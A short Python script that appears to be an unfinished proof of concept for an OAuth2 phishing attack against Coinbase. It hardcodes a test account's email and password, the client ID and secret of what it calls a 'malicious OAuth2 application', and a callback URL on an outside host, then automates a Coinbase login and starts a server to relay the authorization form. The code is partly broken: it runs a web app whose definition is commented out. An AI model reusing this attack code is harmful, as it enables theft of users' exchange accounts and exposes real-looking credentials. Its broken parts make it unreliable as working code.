#!/usr/bin/python
import mechanize
import cookielib
from bottle import Bottle, run, template

# Dummy user to retreive the OAuth form
EMAIL = 'donncha.c.arroll@gmail.com'
PASSWORD = 'coinbase test'

# Credentials for malicious OAuth2 application
CLIENT_ID = '83004d2b1d6af3dbf4bd87bc8512786e4f0f5df0c6b8608247d376110433585c'
CLIENT_SECRET = '3cf47d2462478b162219718afb37cf7b38ae0404b04a2d17b3d20c22b27fb906'
CALLBACK_URL = 'http://tor.totalimpact.ie:8443'
OAUTH_URL = 'https://coinbase.com/oauth/authorize?response_type=code&client_id=' + CLIENT_ID +'&redirect_uri=' + CALLBACK_URL
def retrieveOAuthForm(email, password, oauth_url):

    br = mechanize.Browser()
    cookies = cookielib.LWPCookieJar()
    br.set_cookiejar(cookies)

    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_debug_http(True)
    br.set_debug_responses(True)
    br.set_debug_redirects(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    br.open('https://coinbase.com/signin/') # open twitter
    br.select_form(nr=0) # select the form
    br['email'] = email
    br['password'] = password
    br['stay_signed_in'] = ['1']
    br.submit() # submit the login data
    print(br.response().read) # print the response


 
    #res = browser.open(oauth_url)
    #print res.get_data()   # HTML source of the page

    #browser.select_form(nr=0)
    #print browser.form
  
# Setup Bottle Webserver
#app = Bottle()
#@app.route('/')
#def landingPage():
retrieveOAuthForm(EMAIL, PASSWORD, OAUTH_URL)

run(app, host='0.0.0.0', port=8443)
